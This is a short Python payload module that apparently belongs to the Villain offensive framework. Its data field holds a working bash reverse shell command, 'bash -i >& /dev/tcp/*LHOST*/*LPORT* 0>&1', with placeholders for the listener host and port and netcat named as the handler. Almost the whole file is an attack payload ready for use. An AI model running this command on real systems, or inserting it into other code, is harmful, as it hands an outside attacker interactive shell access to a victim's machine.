# This module is part of the Villain framework

class Payload:

    info = {
        'Title' : 'Bash interactive reverse TCP',
        'Author' : 'Unknown',
        'Description' : 'Bash interactive reverse TCP',
        'References' : ['https://revshells.com']
    }

    meta = {
        'handler' : 'netcat',
        'type' : 'bash-interactive',
        'os' : 'linux'  
    }

    config = {}

    parameters = {
        'lhost' : None
    }

    attrs = {}

    data = 'bash -c "bash -i >& /dev/tcp/*LHOST*/*LPORT* 0>&1"'
